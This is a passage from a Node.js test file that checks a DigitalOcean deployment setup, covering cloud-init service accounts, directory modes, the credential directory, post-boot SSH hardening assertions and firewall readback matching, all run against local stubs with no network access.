// The fix round after Security's read-only gate on build order step 6
// (work/rnd/agent/2026-09-05-security-review-heron-v2-step-6.md): B1-B6, A1-A8 and the notes.
//
// One rule governs this file, and it is the rule the whole v2 rebuild exists for: EVERY refusal
// ships with a fixture that makes it fire. Each test below was run against the code as it stood
// before its fix and seen to fail there first; the report for this round quotes those runs.
//
// Nothing here builds an image, creates a droplet, seals a credential or reaches a network.
// Docker stays down on this laptop. The create sequence runs against a stub directory under
// WREN_NO_NETWORK=1, which is the only way deploy-droplet.sh will run it at all.
//
// Run: node --test test/host-fixes.test.mjs

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  statSync,
  utimesSync,
  writeFileSync,
} from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PKG_DIR = path.join(__dirname, '..');
const DO_DIR = path.join(PKG_DIR, 'digitalocean');
const LIB_DIR = path.join(DO_DIR, 'lib');
const DEPLOY_SCRIPT = path.join(DO_DIR, 'deploy-droplet.sh');
const CLOUD_INIT = path.join(DO_DIR, 'cloud-init.yaml');
const WATCHDOG = path.join(DO_DIR, 'bin', 'wren-watchdog');
const RETENTION = path.join(DO_DIR, 'bin', 'wren-retention');
const POST_BOOT = path.join(LIB_DIR, 'post-boot-assert.sh');
const FIREWALL_MATCH = path.join(LIB_DIR, 'firewall_match.py');
// Wren's units live in this package; the purse CODE is still packages/purse.
const PURSE_SYSTEMD = path.join(PKG_DIR, 'systemd');

function tmp(prefix) {
  return mkdtempSync(path.join(os.tmpdir(), `wren-${prefix}-`));
}

function readCloudInit() {
  return readFileSync(CLOUD_INIT, 'utf8');
}

function runPlan(env = {}) {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--plan'], {
    encoding: 'utf8',
    env: { ...process.env, WREN_NO_NETWORK: '1', ...env },
  });
  assert.equal(result.status, 0, `--plan failed: ${result.stderr}`);
  return result.stdout;
}

/**
 * Every path cloud-init's runcmd creates with install(1), as path -> {mode, owner, group}.
 * The created path is the LAST token of the install line in both shapes it uses:
 *   [ install, -d, -m, "0750", -o, root, -g, root, /srv/wren ]
 *   [ install, -m, "0600", -o, root, -g, root, /dev/null, /srv/wren/image.env ]
 */
function cloudInitInstalledPaths() {
  const created = new Map();
  for (const line of readCloudInit().split('\n')) {
    const match = /^\s*- \[ install,\s*(.+?)\s*\]\s*$/.exec(line);
    if (!match) continue;
    const tokens = match[1].split(',').map((t) => t.trim().replace(/^"|"$/g, ''));
    const flag = (name) => {
      const i = tokens.indexOf(name);
      return i === -1 ? undefined : tokens[i + 1];
    };
    created.set(tokens[tokens.length - 1], {
      mode: flag('-m'),
      owner: flag('-o'),
      group: flag('-g'),
      isDir: tokens.includes('-d'),
    });
  }
  return created;
}

/** Every absolute path any unit file names, with the unit it came from. */
function unitPaths() {
  const found = [];
  const dirs = [path.join(DO_DIR, 'systemd'), PURSE_SYSTEMD];
  for (const dir of dirs) {
    for (const name of readdirSync(dir)) {
      const text = readFileSync(path.join(dir, name), 'utf8');
      for (const raw of text.split('\n')) {
        const line = raw.trim();
        if (line.startsWith('#') || line === '') continue;
        for (const hit of line.matchAll(/\/{1,3}(?:srv|etc|var|run|usr)\/[A-Za-z0-9_.@%\-/]+/g)) {
          const value = hit[0].replace(/^\/+/, '/').replace(/[.,;:]$/, '');
          found.push({ unit: name, path: value });
        }
      }
    }
  }
  return found;
}

// ---------------------------------------------------------------------------
// B1. The purse account, uid/gid 10002, created by cloud-init with the same
//     free-then-resolved pair as 10001 -- and printed in --plan.
// ---------------------------------------------------------------------------

test('B1: cloud-init creates gid/uid 10002 purse, asserting both are free first and resolve after', () => {
  const yaml = readCloudInit();

  assert.match(yaml, /if getent passwd 10002 >\/dev\/null 2>&1; then/, 'no "uid 10002 is free" assertion');
  assert.match(yaml, /if getent group 10002 >\/dev\/null 2>&1; then/, 'no "gid 10002 is free" assertion');
  assert.match(yaml, /- \[ groupadd, --gid, "10002", purse \]/, 'the purse group is never created');
  assert.match(
    yaml,
    /- \[ useradd, --uid, "10002", --gid, "10002", --system, --no-create-home, --home-dir, \/nonexistent, --shell, \/usr\/sbin\/nologin, purse \]/,
    'the purse user is never created, or is created without a fixed uid',
  );
  assert.match(yaml, /not purse:purse/, 'no "resolved to purse:purse" assertion after creation');

  // The shape must match 10001's exactly: it is the pair that catches the collision class that
  // scrapped v1, and half of it catches nothing.
  const freeChecks = yaml.match(/if getent (passwd|group) 1000[123] >\/dev\/null 2>&1; then/g) ?? [];
  assert.equal(freeChecks.length, 6, 'all three accounts need both a passwd and a group free-check');
  const nologin = yaml.match(/--shell, \/usr\/sbin\/nologin/g) ?? [];
  assert.equal(nologin.length, 3, 'all three accounts are nologin');

  // The third: ledger, uid/gid 10003, the settlement signer. Same shape as the other two, and
  // asserted here so a fourth account cannot be added without the free-then-resolved pair.
  assert.match(yaml, /- \[ groupadd, --gid, "10003", ledger \]/, 'the ledger group is never created');
  assert.match(
    yaml,
    /- \[ useradd, --uid, "10003", --gid, "10003", --system, --no-create-home, --home-dir, \/nonexistent, --shell, \/usr\/sbin\/nologin, ledger \]/,
    'the ledger user is never created, or is created without a fixed uid',
  );
  assert.match(yaml, /not ledger:ledger/, 'no "resolved to ledger:ledger" assertion after creation');
});

test('B1: --plan prints the purse row so the Master reads the account before it exists', () => {
  const plan = runPlan();
  assert.match(plan, /purse\s+gid 10002 \/ uid 10002/, '--plan never names the purse account');
  assert.match(plan, /wren\s+gid 10001 \/ uid 10001/, '--plan never names the wren account');
});

test('B1: the purse account is not in the wren group, and the post-boot check asserts it', () => {
  const yaml = readCloudInit();
  assert.doesNotMatch(yaml, /usermod[^\n]*-aG[^\n]*purse/, 'nothing may add purse to another group');
  assert.match(
    readFileSync(POST_BOOT, 'utf8'),
    /id -nG purse[\s\S]*?grep -qx wren/,
    'the post-boot check must refuse if purse is in the wren group',
  );
});

// ---------------------------------------------------------------------------
// B2. Every path any unit names is created by cloud-init, or its parent is --
//     and --plan prints each one with its owner and mode.
// ---------------------------------------------------------------------------

// Paths a unit names that cloud-init deliberately does not create, each with the reason. This list
// is the point of the test: anything not on it and not created must be created, and adding a line
// here is a decision somebody has to write down.
const NOT_CLOUD_INIT = new Map([
  ['/run/wren', 'RuntimeDirectory=wren creates it at unit start; /run is a tmpfs cloud-init cannot pre-create'],
  ['/run/wren/purse.sock', 'the purse creates and chmods its own socket at 0660 purse:wren'],
  ['/run/docker.sock', "the docker.io package's own unit creates it"],
  ['/usr/local/sbin/wren-watchdog', 'installed by deploy-droplet.sh install_host_units, 0755 root:root'],
  ['/usr/local/sbin/wren-alert', 'installed by deploy-droplet.sh install_host_units, 0755 root:root'],
  ['/usr/local/sbin/wren-retention', 'installed by deploy-droplet.sh install_host_units, 0755 root:root'],
  ['/usr/bin/node', "provided by the nodejs package in cloud-init's packages: list"],
  ['/opt/node22/bin/node', 'installed by deploy-droplet.sh --install-purse from the official node 22 build, checksum held as a literal; @mysten/sui requires 22 and Debian 13 ships 20'],
  ['/bin/sh', "the shell the purse unit's ExecStartPre pins run under; the base system's"],
  ['/srv/wren/purse/dist/server.js', 'installed by deploy-droplet.sh --install-purse, 0640 purse:purse, sha256 pinned in the unit'],
  ['/srv/wren/policy/wren-multisig.json', 'installed by deploy-droplet.sh --install-purse, 0644 root:root, sha256 pinned in the unit'],
  ['/srv/wren/policy/wren-policy.json', 'installed by deploy-droplet.sh --install-purse, 0644 root:root, sha256 pinned as --policy-sha256'],
  ['/var/lib/wren/audit/audit.jsonl', 'written by the purse; its directory is created by cloud-init'],
  ['/var/lib/wren/audit/spend.jsonl', 'written by the purse; its directory is created by cloud-init'],
  // The settlement signer, build order step 9. Same three classes as the content purse above:
  // a tmpfs runtime directory systemd makes at unit start, files the installer places under a
  // directory cloud-init did create, and the two audit files the signer itself writes.
  ['/run/wren-ledger', 'RuntimeDirectory=wren-ledger creates it at unit start; /run is a tmpfs cloud-init cannot pre-create'],
  ['/run/wren-ledger/purse.sock', 'the settlement purse creates and chmods its own socket at 0660 ledger:ledger'],
  // The settlement signer's own tree, created by --install-ledger rather than cloud-init: Wren's
  // host was built before this account existed. Its own copies, because /srv/wren/purse is
  // 0750 purse:purse and ledger is deliberately not in the purse group.
  ['/srv/wren-ledger/dist/server.js', 'installed by deploy-droplet.sh --install-ledger, 0640 ledger:ledger, sha256 pinned in the unit'],
  ['/srv/wren-ledger/dist/ledger-tick.js', 'installed by deploy-droplet.sh --install-ledger, 0644 root:root'],
  ['/srv/wren-ledger/policy/wren-ledger.mainnet.json', 'installed by deploy-droplet.sh --install-ledger, 0644 root:root, sha256 pinned as --policy-sha256'],
  ['/srv/wren-ledger/chain.json', 'installed by deploy-droplet.sh --install-ledger, 0600 ledger:ledger; /srv/wren/chain.json is 0600 purse:purse and unreadable here'],
  ['/var/lib/wren-ledger/audit/audit.jsonl', 'written by the settlement purse; its directory is created by cloud-init'],
  ['/var/lib/wren-ledger/audit/spend.jsonl', 'written by the settlement purse; its directory is created by cloud-init'],
  ['/var/lib/wren-ledger/state/ledger.json', 'written by ledger-tick after a settlement is signed; its directory is created by cloud-init'],
]);

test('B2: every path any unit names is created by cloud-init, or its parent directory is', () => {
  const created = cloudInitInstalledPaths();
  const isCreated = (p) => created.has(p);
  const parentCreated = (p) => {
    const parent = path.posix.dirname(p);
    return created.has(parent) && created.get(parent).isDir;
  };

  const problems = [];
  for (const { unit, path: value } of unitPaths()) {
    if (isCreated(value) || parentCreated(value) || NOT_CLOUD_INIT.has(value)) continue;
    problems.push(`${unit} names ${value}, which cloud-init neither creates nor creates a parent for`);
  }
  assert.deepEqual(problems, [], problems.join('\n'));
});

test('B2: the hot key\'s home and the signer\'s paths are created, at the mode they must have', () => {
  const created = cloudInitInstalledPaths();
  const expect = [
    ['/srv/wren/keys', '0700', 'purse', 'purse'],
    ['/srv/wren/purse', '0750', 'purse', 'purse'],
    ['/srv/wren/policy', '0755', 'root', 'root'],
    ['/srv/wren/runs', '2770', 'root', 'wren'],
    ['/srv/wren/runs/archive', '2770', 'root', 'wren'],
    ['/srv/wren/state', '2770', 'root', 'wren'],
    ['/etc/wren/creds', '0700', 'root', 'root'],
    ['/var/lib/wren/audit', '0700', 'purse', 'purse'],
  ];
  for (const [p, mode, owner, group] of expect) {
    const row = created.get(p);
    assert.ok(row, `cloud-init never creates ${p}`);
    assert.equal(row.mode, mode, `${p} is created ${row.mode}, not ${mode}`);
    assert.equal(row.owner, owner, `${p} is owned by ${row.owner}, not ${owner}`);
    assert.equal(row.group, group, `${p} is grouped ${row.group}, not ${group}`);
  }
});

test('B2: --plan prints every path cloud-init creates, with its mode and owner', () => {
  const plan = runPlan();
  for (const [p, row] of cloudInitInstalledPaths()) {
    if (p === '/dev/null') continue;
    assert.ok(plan.includes(p), `--plan never names ${p}`);
    const rowPattern = new RegExp(`${p.replace(/[/.]/g, '\\$&')}\\s+${row.mode}\\s+${row.owner}:${row.group}`);
    assert.match(plan, rowPattern, `--plan does not print ${p} as ${row.mode} ${row.owner}:${row.group}`);
  }
});

// ---------------------------------------------------------------------------
// B3. One credential directory: /etc/wren/creds, everywhere.
// ---------------------------------------------------------------------------

test('B3: no unit, script, config or document names any credential directory but /etc/wren/creds', () => {
  const files = [];
  const walk = (dir) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      if (entry.name === 'node_modules' || entry.name.startsWith('.git')) continue;
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) walk(full);
      else files.push(full);
    }
  };
  walk(DO_DIR);
  walk(PURSE_SYSTEMD);
  files.push(path.join(PKG_DIR, 'run-flags.txt'));

  const offenders = [];
  for (const file of files) {
    const text = readFileSync(file, 'utf8');
    text.split('\n').forEach((line, index) => {
      // The one legitimate mention is this test's own subject being named in a comment explaining
      // why it is gone; a comment that says "/srv/wren/creds" and nothing else would pass, so the
      // match is on a path in use: preceded by an = or a space and followed by a file or nothing.
      const match = /(?<![\w-])\/(?:srv|var|opt)\/[A-Za-z0-9_./-]*creds\b/.exec(line);
      if (match && !line.trim().startsWith('#')) {
        offenders.push(`${path.relative(PKG_DIR, file)}:${index + 1}: ${line.trim()}`);
      }
    });
  }
  assert.deepEqual(offenders, [], `a second credential directory is still in use:\n${offenders.join('\n')}`);
});

test('B3: the beat unit and the purse unit load their credentials from the same directory', () => {
  const beat = readFileSync(path.join(PURSE_SYSTEMD, 'wren-beat.service'), 'utf8');
  const purse = readFileSync(path.join(PURSE_SYSTEMD, 'wren-purse.service'), 'utf8');
  const alert = readFileSync(path.join(DO_DIR, 'systemd', 'wren-alert@.service'), 'utf8');
  assert.match(beat, /LoadCredentialEncrypted=openrouter:\/etc\/wren\/creds\/openrouter\.cred/);
  assert.match(purse, /LoadCredentialEncrypted=wren-hot:\/etc\/wren\/creds\/wren-hot\.cred/);
  assert.match(alert, /LoadCredentialEncrypted=mail-key:\/etc\/wren\/creds\/mail-key\.cred/);
});

test('B3: --seal writes into /etc/wren/creds and --plan and the README say the same', () => {
  const dryRun = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key', '--dry-run'], { encoding: 'utf8' });
  assert.equal(dryRun.status, 0, dryRun.stderr);
  assert.match(dryRun.stdout, /\/etc\/wren\/creds\/mail-key\.cred/);
  assert.match(runPlan(), /\/etc\/wren\/creds/);
  assert.match(readFileSync(path.join(DO_DIR, 'README.md'), 'utf8'), /\/etc\/wren\/creds/);
});

// ---------------------------------------------------------------------------
// B4. The post-boot assertions, run against a fixture that emulates a non-root
//     shell: the block as it was fails there; the block as it is passes.
// ---------------------------------------------------------------------------

/**
 * A stand-in for the droplet, as seen from the `ops` account.
 *
 * The emulation that matters: `sshd` and `cloud-init` refuse unless the environment says the
 * caller is privileged, exactly as they do on Debian, where sshd -T must read 0600 root host keys
 * and cloud-init reads root-only state. The `sudo` stub is the only thing that sets that marker.
 */
function hostFixture() {
  const dir = tmp('postboot');
  const bin = path.join(dir, 'bin');
  mkdirSync(bin);

  const write = (name, body) => {
    const file = path.join(bin, name);
    writeFileSync(file, body, 'utf8');
    chmodSync(file, 0o755);
  };

  write('sudo', `#!/usr/bin/env bash\nexec env WREN_FIXTURE_PRIVILEGED=1 "$@"\n`);
  write(
    'cloud-init',
    `#!/usr/bin/env bash
if [ "\${WREN_FIXTURE_PRIVILEGED:-}" != "1" ]; then
  echo "cloud-init: this command requires root privileges" >&2
  exit 1
fi
case "$1" in
  status) printf 'status: done\\nextended_status: done\\nerrors: []\\n' ;;
  schema) echo "Valid schema /var/lib/cloud/instances/x/cloud-config.txt" ;;
esac
exit 0
`,
  );
  write(
    'sshd',
    `#!/usr/bin/env bash
if [ "\${WREN_FIXTURE_PRIVILEGED:-}" != "1" ]; then
  echo "sshd: no hostkeys available -- exiting (/etc/ssh/ssh_host_ed25519_key: Permission denied)" >&2
  exit 1
fi
printf 'passwordauthentication no\\npermitrootlogin no\\nkbdinteractiveauthentication no\\nport 22\\n'
exit 0
`,
  );
  write(
    'getent',
    `#!/usr/bin/env bash
case "$1:$2" in
  passwd:10001) echo "wren:x:10001:10001::/nonexistent:/usr/sbin/nologin" ;;
  group:10001)  echo "wren:x:10001:" ;;
  passwd:10002) echo "purse:x:10002:10002::/nonexistent:/usr/sbin/nologin" ;;
  group:10002)  echo "purse:x:10002:" ;;
  *) exit 2 ;;
esac
exit 0
`,
  );
  write('id', `#!/usr/bin/env bash\n[ "\${1:-}" = "-nG" ] && { echo "purse"; exit 0; }\nexit 0\n`);

  // /etc/debian_version and /etc/ssh/sshd_config.d
  writeFileSync(path.join(dir, 'debian_version'), '13.1\n', 'utf8');
  const sshdConfD = path.join(dir, 'sshd_config.d');
  mkdirSync(sshdConfD);
  writeFileSync(path.join(sshdConfD, '00-wren.conf'), 'PasswordAuthentication no\n', 'utf8');
  writeFileSync(path.join(sshdConfD, '50-cloud-init.conf'), 'PasswordAuthentication yes\n', 'utf8');

  // The /srv/wren, /etc/wren and /var/lib/wren layout, at the modes cloud-init claims.
  const srv = path.join(dir, 'srv-wren');
  const etc = path.join(dir, 'etc-wren');
  const varlib = path.join(dir, 'var-wren');
  const make = (p, mode) => {
    mkdirSync(p, { recursive: true });
    chmodSync(p, mode);
  };
  make(srv, 0o751);
  make(path.join(srv, 'bin'), 0o755);
  make(path.join(srv, 'runs'), 0o2770);
  make(path.join(srv, 'runs', 'archive'), 0o2770);
  make(path.join(srv, 'state'), 0o2770);
  make(path.join(srv, 'keys'), 0o700);
  make(path.join(srv, 'purse'), 0o750);
  make(path.join(srv, 'purse', 'dist'), 0o750);
  make(path.join(srv, 'policy'), 0o755);
  make(etc, 0o700);
  make(path.join(etc, 'creds'), 0o700);
  make(varlib, 0o700);
  make(path.join(varlib, 'audit'), 0o700);
  // The dead man's own memory, 0700 root:root on the host (Security's N-1 on the second read).
  make(path.join(varlib, 'watchdog'), 0o700);

  // The two files whose MODE the post-boot check now asserts, because --plan's step 10 claimed it
  // asserted "every path above" while asserting thirteen directories and no file at all (N-5).
  writeFileSync(path.join(srv, 'image.env'), '', 'utf8');
  chmodSync(path.join(srv, 'image.env'), 0o600);
  writeFileSync(path.join(srv, 'chain.json'), '', 'utf8');
  chmodSync(path.join(srv, 'chain.json'), 0o600);

  // The resolver path wren-alert@.service's RestrictAddressFamilies list is written against.
  const nsswitch = path.join(dir, 'nsswitch.conf');
  writeFileSync(nsswitch, 'passwd:         files\nhosts:          files dns\n', 'utf8');

  const env = {
    ...process.env,
    PATH: `${bin}:${process.env.PATH}`,
    WREN_SSHD_BIN: path.join(bin, 'sshd'),
    WREN_DEBIAN_VERSION_FILE: path.join(dir, 'debian_version'),
    WREN_SSHD_CONFIG_D: sshdConfD,
    WREN_SRV_ROOT: srv,
    WREN_ETC_ROOT: etc,
    WREN_VAR_ROOT: varlib,
    WREN_NSSWITCH_FILE: nsswitch,
    // /usr/bin/node is what wren-purse.service's ExecStart names; this laptop's node stands in
    // for it so the assertion runs here too.
    WREN_NODE_BIN: process.execPath,
    // Owners cannot be asserted on this laptop: there is no purse account and nothing runs as
    // root. Modes, accounts, sshd and cloud-init all can be, and are.
    WREN_ASSERT_OWNERS: '0',
  };
  delete env.WREN_FIXTURE_PRIVILEGED;
  return { dir, srv, etc, env };
}

// The block exactly as it shipped before this fix (deploy-droplet.sh's assert_post_boot heredoc,
// commit 8aff2c5). Kept verbatim as a fixture so the claim "it would have destroyed every droplet"
// is a thing that runs, not a thing that is asserted in prose.
const PRE_FIX_POST_BOOT = `set -euo pipefail
cloud-init status --wait --long
cloud-init schema --system
RESOLVED_USER="$(getent passwd 10001 | cut -d: -f1)"
RESOLVED_GROUP="$(getent group 10001 | cut -d: -f1)"
[ "$RESOLVED_USER" = "wren" ] || { echo "uid 10001 is not wren"; exit 1; }
[ "$RESOLVED_GROUP" = "wren" ] || { echo "gid 10001 is not wren"; exit 1; }
grep -q "^13" /etc/debian_version || { echo "not Debian 13"; exit 1; }
sshd -T | grep -qE '^passwordauthentication no$'
sshd -T | grep -qE '^permitrootlogin no$'
sshd -T | grep -qE '^kbdinteractiveauthentication no$'
echo "post-boot assertions passed"
`;

test('B4: the post-boot block AS IT WAS fails on a non-root shell -- every droplet destroyed seconds after boot', () => {
  const fixture = hostFixture();
  try {
    const result = spawnSync('bash', ['-s'], { input: PRE_FIX_POST_BOOT, encoding: 'utf8', env: fixture.env });
    assert.notEqual(result.status, 0, 'the pre-fix block must fail here; if it passes, this fixture proves nothing');
    assert.match(
      result.stderr,
      /requires root privileges/,
      'it must fail for the reason the review named: a privileged command run unprivileged',
    );
    assert.doesNotMatch(result.stdout, /post-boot assertions passed/);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B4: the post-boot block AS IT IS passes on the same fixture, under sudo', () => {
  const fixture = hostFixture();
  try {
    const result = spawnSync('bash', [POST_BOOT], { encoding: 'utf8', env: fixture.env });
    assert.equal(result.status, 0, `post-boot-assert.sh failed: ${result.stderr}`);
    assert.match(result.stdout, /post-boot assertions passed/);
    assert.match(result.stdout, /sshd -T: passwordauthentication no/);
    assert.match(result.stdout, /sshd -T: permitrootlogin no/);
    assert.match(result.stdout, /sshd -T: kbdinteractiveauthentication no/);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B4: the hardening keywords are read out of sshd -T, so a "yes" fails the deploy', () => {
  const fixture = hostFixture();
  try {
    // Same host, same sudo, one keyword flipped: the assertion must catch it.
    writeFileSync(
      path.join(fixture.dir, 'bin', 'sshd'),
      `#!/usr/bin/env bash
if [ "\${WREN_FIXTURE_PRIVILEGED:-}" != "1" ]; then exit 1; fi
printf 'passwordauthentication no\\npermitrootlogin yes\\nkbdinteractiveauthentication no\\n'
`,
      'utf8',
    );
    chmodSync(path.join(fixture.dir, 'bin', 'sshd'), 0o755);
    const result = spawnSync('bash', [POST_BOOT], { encoding: 'utf8', env: fixture.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /permitrootlogin yes/);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B4: a mode that drifted from what cloud-init claims fails the post-boot check', () => {
  const fixture = hostFixture();
  try {
    chmodSync(path.join(fixture.srv, 'keys'), 0o755); // the hot key's home, world-readable
    const result = spawnSync('bash', [POST_BOOT], { encoding: 'utf8', env: fixture.env });
    assert.notEqual(result.status, 0, 'a 0755 keys directory must fail the deploy');
    assert.match(result.stderr, /keys: mode 0755, expected 0700/);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B4: a plaintext credential left under /srv/wren fails the post-boot check', () => {
  const fixture = hostFixture();
  try {
    writeFileSync(path.join(fixture.srv, 'keys', 'wren-hot.key'), 'NOT-A-REAL-VALUE\n', 'utf8');
    const result = spawnSync('bash', [POST_BOOT], { encoding: 'utf8', env: fixture.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /a credential-shaped file under/);
  } finally {
    rmSync(fixture.dir, { recursive: true, force: true });
  }
});

test('B4: every privileged command in the post-boot file carries sudo, and sshd by absolute path', () => {
  const text = readFileSync(POST_BOOT, 'utf8');
  assert.match(text, /SSHD_BIN="\$\{WREN_SSHD_BIN:-\/usr\/sbin\/sshd\}"/, 'sshd must default to its absolute path');
  for (const line of text.split('\n')) {
    const trimmed = line.trim();
    if (trimmed.startsWith('#')) continue;
    // Strip quoted strings first: a refusal MESSAGE naming `cloud-init status` is prose, not a
    // command, and a lint that cannot tell them apart would be satisfied by deleting the message.
    const code = trimmed.replace(/"[^"]*"/g, '""').replace(/'[^']*'/g, "''");
    const invocation = /(?:^|[;&|(]|\$\()\s*(cloud-init|sshd)\s/.exec(code);
    if (invocation && !/\$SUDO/.test(code)) {
      assert.fail(`a privileged command with no sudo: ${trimmed}`);
    }
  }
});

// ---------------------------------------------------------------------------
// B5. The firewall readback: compared on protocol, ports and sorted addresses.
// ---------------------------------------------------------------------------

const REQUESTED_FIREWALL = {
  inbound_rules: [{ protocol: 'tcp', ports: '22', sources: { addresses: ['203.0.113.4'] } }],
  outbound_rules: [
    { protocol: 'tcp', ports: '443', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
    { protocol: 'tcp', ports: '53', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
    { protocol: 'udp', ports: '53', destinations: { addresses: ['0.0.0.0/0', '::/0'] } },
  ],
};

// What DigitalOcean actually echoes: all four source/destination keys, and the addresses in
// whatever order it feels like.
function digitalOceanEcho(overrides = {}) {
  const side = (addresses) => ({
    addresses,
    droplet_ids: [],
    tags: [],
    load_balancer_uids: [],
  });
  return {
    firewall: {
      id: 'fw-1',
      name: 'wren-first-fw',
      tags: ['wren-v2'],
      inbound_rules: [{ protocol: 'tcp', ports: overrides.inboundPort ?? '22', sources: side(['203.0.113.4']) }],
      outbound_rules: [
        { protocol: 'tcp', ports: '443', destinations: side(['::/0', '0.0.0.0/0']) },
        { protocol: 'udp', ports: '53', destinations: side(['0.0.0.0/0', '::/0']) },
        { protocol: 'tcp', ports: '53', destinations: side(['::/0', '0.0.0.0/0']) },
        ...(overrides.extraInbound ? [] : []),
      ],
      ...(overrides.firewall ?? {}),
    },
  };
}

function runFirewallMatch(requested, readback) {
  const dir = tmp('fw');
  try {
    const a = path.join(dir, 'requested.json');
    const b = path.join(dir, 'readback.json');
    writeFileSync(a, JSON.stringify(requested), 'utf8');
    writeFileSync(b, JSON.stringify(readback), 'utf8');
    return spawnSync('python3', [FIREWALL_MATCH, a, b], { encoding: 'utf8' });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test('B5: a DigitalOcean-shaped echo of a correct firewall MATCHES (droplet_ids, tags, load_balancer_uids and all)', () => {
  const result = runFirewallMatch(REQUESTED_FIREWALL, digitalOceanEcho());
  assert.equal(result.status, 0, `a correct firewall was refused: ${result.stderr}`);
  assert.match(result.stdout, /matches what was asked/);
});

test('B5: the raw-object comparison this replaces would have refused that same correct firewall', () => {
  // The pre-fix line was `readback["inbound_rules"] != inbound`. Shown here rather than described:
  // the echo and the request are not equal objects, and never can be.
  const echo = digitalOceanEcho().firewall;
  assert.notDeepEqual(echo.inbound_rules, REQUESTED_FIREWALL.inbound_rules);
});

test('B5: a changed port is a MISMATCH', () => {
  const result = runFirewallMatch(REQUESTED_FIREWALL, digitalOceanEcho({ inboundPort: '2222' }));
  assert.equal(result.status, 1, 'a firewall admitting a different port must be refused');
  assert.match(result.stderr, /FIREWALL READBACK MISMATCH/);
  assert.match(result.stderr, /asked for tcp\/22/);
  assert.match(result.stderr, /the firewall has tcp\/2222 .* and it was never asked for/s);
});

test('B5: a rule that was never asked for is a MISMATCH, even though everything asked for is there', () => {
  const echo = digitalOceanEcho();
  echo.firewall.inbound_rules.push({
    protocol: 'tcp',
    ports: '80',
    sources: { addresses: ['0.0.0.0/0'], droplet_ids: [], tags: [], load_balancer_uids: [] },
  });
  const result = runFirewallMatch(REQUESTED_FIREWALL, echo);
  assert.equal(result.status, 1, 'a firewall that admits MORE than it was asked to admit must be refused');
  assert.match(result.stderr, /never asked for/);
});

test('B5: a changed source address is a MISMATCH', () => {
  const echo = digitalOceanEcho();
  echo.firewall.inbound_rules[0].sources.addresses = ['0.0.0.0/0'];
  const result = runFirewallMatch(REQUESTED_FIREWALL, echo);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /203\.0\.113\.4/);
});

test('B5: the deploy uses this module rather than comparing raw objects', () => {
  const script = readFileSync(DEPLOY_SCRIPT, 'utf8');
  const api = readFileSync(path.join(LIB_DIR, 'do_api.py'), 'utf8');
  assert.doesNotMatch(script, /readback\["inbound_rules"\] != inbound/, 'the raw-object comparison must be gone');
  // The create call moved out of a heredoc in the deploy script and into lib/do_api.py, so the
  // "created, readback failed, now delete it" path could be run at all (Security's N-4).
  assert.match(script, /\$DO_API" firewall-create/, 'create_firewall must call the module');
  assert.match(api, /matcher\.differences\(/, 'firewall-create must use the shared comparison');
});

// ---------------------------------------------------------------------------
// B6 and A1. The rollback trap, and the firewall before the droplet.
// ---------------------------------------------------------------------------

/**
 * A stub directory standing in for DigitalOcean and SSH. Each stub records that it was called, in
 * order, so the sequence itself can be asserted -- not only its result.
 */
function createStubs({ failAt } = {}) {
  const dir = tmp('create');
  const stubs = path.join(dir, 'stubs');
  mkdirSync(stubs);
  const orderFile = path.join(dir, 'order');
  writeFileSync(orderFile, '', 'utf8');

  const stub = (name, body) => {
    const file = path.join(stubs, name);
    writeFileSync(file, `#!/usr/bin/env bash\nprintf '%s\\n' "${name}" >> "$WREN_TEST_ORDER"\n${body}\n`, 'utf8');
    chmodSync(file, 0o755);
  };

  // The two read-only account reads --create makes before anything is created. They are network
  // calls, so under WREN_NO_NETWORK=1 they go through the same seam as everything else.
  stub('check_image_slug', 'echo "image slug listed"');
  stub('check_no_existing_firewall', 'echo "no firewall targets wren-v2"');
  stub('create_firewall', 'echo "fw-1234"');
  stub('register_ssh_key', 'echo "key-99"');
  stub('create_droplet', 'echo "drop-5678"');
  stub('wait_for_droplet_ip', 'echo "203.0.113.9"');
  stub('wait_for_ssh', 'exit 0');
  stub(
    'assert_post_boot',
    failAt === 'assert_post_boot'
      ? 'echo "post-boot: refused - simulated failure" >&2; exit 1'
      : 'echo "post-boot assertions passed"',
  );
  stub('build_image_on_host', failAt === 'build_image_on_host' ? 'exit 1' : 'echo "image built"');
  stub('install_host_units', 'echo "units installed"');
  stub('destroy_droplet', `touch "$WREN_TEST_DIR/destroyed-$1"`);
  stub('delete_firewall', `touch "$WREN_TEST_DIR/deleted-$1"`);

  const doToken = path.join(dir, 'do-token');
  writeFileSync(doToken, 'not-a-real-token\n', { mode: 0o600 });
  chmodSync(doToken, 0o600);
  const sshKey = path.join(dir, 'id_ed25519.pub');
  writeFileSync(sshKey, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');

  return {
    dir,
    orderFile,
    records: path.join(dir, 'records'),
    env: {
      ...process.env,
      WREN_DEPLOY_CONFIRMED: '1',
      WREN_NO_NETWORK: '1',
      WREN_STUB_DIR: stubs,
      WREN_TEST_DIR: dir,
      WREN_TEST_ORDER: orderFile,
      WREN_RUN_RECORD_DIR: path.join(dir, 'records'),
      WREN_DESK_IP: '203.0.113.4',
      DO_TOKEN_FILE: doToken,
      SSH_PUBLIC_KEY_FILE: sshKey,
    },
  };
}

function callOrder(fixture) {
  return readFileSync(fixture.orderFile, 'utf8').split('\n').filter(Boolean);
}

function runRecord(fixture) {
  const file = path.join(fixture.records, 'deploy-runs.jsonl');
  if (!existsSync(file)) return [];
